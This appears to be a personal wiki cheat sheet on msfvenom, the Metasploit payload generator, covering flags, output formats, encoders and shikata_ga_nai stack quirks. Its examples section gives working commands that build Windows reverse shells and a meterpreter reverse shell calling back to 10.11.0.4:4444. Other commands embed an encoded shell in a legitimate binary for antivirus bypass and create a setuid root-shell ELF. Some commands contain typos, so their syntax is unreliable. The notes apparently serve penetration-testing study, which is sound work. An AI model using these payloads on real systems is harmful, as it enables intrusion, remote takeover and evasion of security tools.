Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-09-28T14:27:35-05:00

====== msfvenom ======
Created Tuesday 28 September 2021

Creates payloads for all you exploitation needs

===== Usage =====
{{{code: lang="sh" linenumbers="False"
msfvenom <options>
}}}


===== Flags =====
{{{code: lang="texinfo" linenumbers="False"
-l, --list	<type>							Lists all possibilities for <type>. Type is [payloads|encoders|nops|platforms|archs|encrypt|formats|all]
-p, --payload <payload>	[--list-options]	Specify payload <payload>. Append --list-options to get a list of the payload's options
<option>=<value>							Specify payload option. eg. LHOST=10.10.10.10, more than one can be specified
-f <format>									Format to use for output
-b, --bad-chars <list>					    Characters to avoid example: '\x00\xff'. This will try to use an encoder to avoid the bad chars. See "encoders"
-e <encoder>								Use encoder to encode output.
-i <num>									Amount of encoding rounds to use
-v <name>									Name of the variable use to put the shellcode in
-x <binary>									embed the payload into <binary>
-o <file>									Output the payload into <file>
}}}


===== Transform Formats =====
{{{code: lang="texinfo" linenumbers="False"
hta-psh										Outputs shellcode as HTMLAPP using powershell
base32
base64
bash
c 											Outputs shellcode as c source code
csharp
dw
dword
hex
java
js_be
js_le
num
perl
pl
powershell
ps1
py
python										Outputs shellcode as python source code
raw
rb
ruby
sh
vbapplication
vbscript
}}}


===== Executable Formats =====
{{{code: lang="texinfo" linenumbers="False"
aspx
aspx-exe
axis2
dll
elf
elf-so
exe											Outputs the payload as a windows executable
exe-only
exe-service
exe-small
hta-psh										Outputs shellcode as HTMLAPP using powershell
jar
jsp											Java Server Page
loop-vbs
macho
msi
msi-nouac
osx-app
psh
psh-cmd
psh-net
psh-reflection
python-reflection
vba
vba-exe
vba-psh
vbs
war											Output shell code as java web archive format
}}}

* [[File Extensions:JSP]]

===== Payloads =====

===== Staged vs Unstaged =====
* An unstaged payload is sent in its entirety along with the exploit. This has a higher chance of detection.
* A staged payload will send a loader along with the exploit, then will connect back to the attacker's machine and download the rest, which then is executed
* In metasploit, the / denounces a staged payload, _ means an unstaged done


===== Encoders =====
Encoders encode the payload in way that avoids bad characters. To do this, it prepends a bit of decoder logic to the payload.
The decoder logic attempts to get the current instruction pointer, AND USES THE STACK. This could possibly overwrite the first bit of the payload, corrupting it in the process.
It is recommended to add a bunch of NOPS (x90) * 10 in front of the encoded payload to avoid this problem. Alternatives are DEC ESP instructions. (or SUB ESP, x  See remarks for this one)

==== x86/shikata_ga_nai ====
[[https://www.boozallen.com/insights/cyber/shellcode/shikata-ga-nai-encoder.html|How Shikata-ga-nai works]]

* Stores 28 bytes of metadata at esp upon execution. (tested on x86), but stores this on esp-12.
* This means you'll need to allocate 16 bytes at least in order not to overwrite the payload.
* The limit is 6 bytes. This will overwrite already excuted code up until the the instruction at EIP. 
* Keep in mind you can get 6 when working with NOPS, when adjusting ESP 8 is the minimum


==== Remarks ====
* When adjusting the stack to make some space for the decoder generated metadata. ALWAYS USE A MULTIPLE OF THE STACK WIDTH. If you don't, you'll mess up the stack alignment which creates weird problems when running the shellcode. ie multiples of 4 for x86 and multiples of 8 for x64.  Don't go over dec. 124 though, as this will create a bunch of null bytes in the opcode.

===== Examples =====

==== List shell options for windows ====
{{{code: lang="sh" linenumbers="False"
msfvenom --list payloads | grep windows/shell
}}}


==== Reverse TCP Shell for windows ====
{{{code: lang="sh" linenumbers="False"
msfvenom -p windows/shell_reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -f c -b "<bad bytes>"
}}}

Generates a reverse shell to be run on windows, which will connect back to <host>:<port>

==== Reverse meterpreter tcp shell for windows ====
{{{code: lang="sh" linenumbers="False"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe
}}}


===== Reverse single stage tcp shell embedded in binary, encoded with shikata-ga-nai, using some bad bytes =====
{{{code: lang="sh" linenumbers="False"
msfvenom -p windows/shell_reverse_tcp LHOST=<host> LPORT=<port> -e ex86/shikata-ga-nai -b"\xff\x06" -f exe -x <binary> -o <final_form.exe>
}}}

* Maybe useful in AV bypass

===== Program that will execute /bin/bash with suid bit set =====
{{{code: lang="texinfo" linenumbers="False"
msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf > toroot
}}}


===== SEE =====
[[payloads]]
[[AV Bypass]]
